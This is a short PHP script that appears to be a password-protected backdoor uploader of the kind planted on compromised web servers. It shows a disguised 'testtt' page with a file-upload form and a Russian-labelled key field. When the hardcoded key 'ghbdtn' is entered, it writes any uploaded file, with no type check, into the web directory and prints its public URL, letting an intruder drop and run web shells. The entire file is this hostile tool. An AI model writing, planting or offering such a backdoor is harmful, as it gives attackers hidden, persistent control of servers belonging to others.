<?php
print 'testtt';
print '<center><form enctype="multipart/form-data" method="POST"><input name="upload" type="file" /><input type="submit" value=">>" />';
print '<br><br><input type="text" title="ключик" onClick="this.value=\'\';" value="     ключ для загрузки файла ввести сюда" name ="key" style="width: 300px;"></form>';

$key = urldecode($_POST["key"]);
if ($key == "ghbdtn") {
    $uploadfile = $uploaddir . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadfile)) {
      print '<br><a href="'.dirname('http://'.$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']).'/'.$_FILES[upload][name].'">'.dirname('http://'.$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']).'/'.$_FILES[upload][name].'</a>';
    }
    print '<br><H1>'.$key.'</H1><br>';
}
?>